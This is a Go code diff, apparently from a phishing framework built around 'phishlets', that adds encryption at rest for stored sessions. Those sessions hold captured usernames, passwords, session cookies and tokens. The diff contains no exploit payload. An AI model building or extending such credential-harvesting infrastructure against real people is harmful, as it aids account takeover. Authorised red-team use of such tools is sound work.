@@ -6,6 +6,7 @@ import (
 	"sort"
 	"time"
 
+	"github.com/s4l1hs/olta/pkg/campaign/secrets"
 	"github.com/tidwall/buntdb"
 )
 
@@ -46,11 +47,16 @@ func (d *Database) sessionsInit() error {
 }
 
 func (d *Database) loadSessions() error {
-	return d.db.View(func(tx *buntdb.Tx) error {
+	var loadErr error
+	err := d.db.View(func(tx *buntdb.Tx) error {
 		return tx.Ascend("sessions_id", func(_, value string) bool {
 			s := &Session{}
 			if err := json.Unmarshal([]byte(value), s); err != nil {
-				d.lastErr = err
+				loadErr = err
+				return false
+			}
+			if err := openSession(s); err != nil {
+				loadErr = err
 				return false
 			}
 			normalizeSession(s)
@@ -62,6 +68,113 @@ func (d *Database) loadSessions() error {
 			return true
 		})
 	})
+	if err != nil {
+		return err
+	}
+	return loadErr
+}
+
+func (d *Database) protectPersistedSessions() error {
+	d.stateMu.RLock()
+	values := make(map[string]string, len(d.sessionsByID))
+	for id, session := range d.sessionsByID {
+		value, err := marshalSession(session)
+		if err != nil {
+			d.stateMu.RUnlock()
+			return err
+		}
+		values[sessionKey(id)] = value
+	}
+	d.stateMu.RUnlock()
+	return d.db.Update(func(tx *buntdb.Tx) error {
+		for key, value := range values {
+			if _, _, err := tx.Set(key, value, nil); err != nil {
+				return err
+			}
+		}
+		return nil
+	})
+}
+
+func storedSession(session *Session) (*Session, error) {
+	stored := cloneSession(session)
+	fields := []*string{&stored.LandingURL, &stored.Username, &stored.Password, &stored.UserAgent, &stored.RemoteAddr}
+	for _, field := range fields {
+		value, err := secrets.Encrypt(*field)
+		if err != nil {
+			return nil, err
+		}
+		*field = value
+	}
+	for key, value := range stored.Custom {
+		protected, err := secrets.Encrypt(value)
+		if err != nil {
+			return nil, err
+		}
+		stored.Custom[key] = protected
+	}
+	for _, values := range []map[string]string{stored.BodyTokens, stored.HttpTokens} {
+		for key, value := range values {
+			protected, err := secrets.Encrypt(value)
+			if err != nil {
+				return nil, err
+			}
+			values[key] = protected
+		}
+	}
+	for _, values := range stored.CookieTokens {
+		for _, token := range values {
+			if token == nil {
+				continue
+			}
+			protected, err := secrets.Encrypt(token.Value)
+			if err != nil {
+				return nil, err
+			}
+			token.Value = protected
+		}
+	}
+	return stored, nil
+}
+
+func openSession(session *Session) error {
+	fields := []*string{&session.LandingURL, &session.Username, &session.Password, &session.UserAgent, &session.RemoteAddr}
+	for _, field := range fields {
+		value, err := secrets.Decrypt(*field)
+		if err != nil {
+			return err
+		}
+		*field = value
+	}
+	for key, value := range session.Custom {
+		plaintext, err := secrets.Decrypt(value)
+		if err != nil {
+			return err
+		}
+		session.Custom[key] = plaintext
+	}
+	for _, values := range []map[string]string{session.BodyTokens, session.HttpTokens} {
+		for key, value := range values {
+			plaintext, err := secrets.Decrypt(value)
+			if err != nil {
+				return err
+			}
+			values[key] = plaintext
+		}
+	}
+	for _, values := range session.CookieTokens {
+		for _, token := range values {
+			if token == nil {
+				continue
+			}
+			plaintext, err := secrets.Decrypt(token.Value)
+			if err != nil {
+				return err
+			}
+			token.Value = plaintext
+		}
+	}
+	return nil
 }
 
 func (d *Database) sessionsCreate(sid, phishlet, landingURL, userAgent, remoteAddr string) error {
